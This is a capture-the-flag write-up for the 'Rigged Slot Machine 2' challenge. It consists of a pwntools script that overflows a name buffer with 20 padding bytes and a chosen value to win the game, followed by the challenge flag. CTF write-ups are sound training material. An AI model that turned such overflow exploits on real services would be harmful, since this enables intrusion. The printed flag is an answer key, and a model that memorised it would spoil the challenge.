# Rigged Slot Machine 2

Solved by: @w6rstpain

## Question:
The casino fixed their slot machine algorithm - good luck hitting that jackpot now! 🤭
## Solution:
```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.recvuntil(b'Enter your name:')
    p.sendline(payload)
    p.wait()
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './rigged_slot2'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


#offset = find_ip(cyclic(500))

# Start program
p = start()


payload = flat(
    b'A' * 20,
    0x14684d
    
)


p.recvuntil(b'Enter your name:')
p.sendline(payload)
p.recvuntil(b'Enter your bet amount (up to $100 per spin):')
p.sendline("1")

output = p.recvall()  
print(output)
```

**Flag:** `INTIGRITI{1_w15h_17_w45_7h15_345y_1n_v3645}`
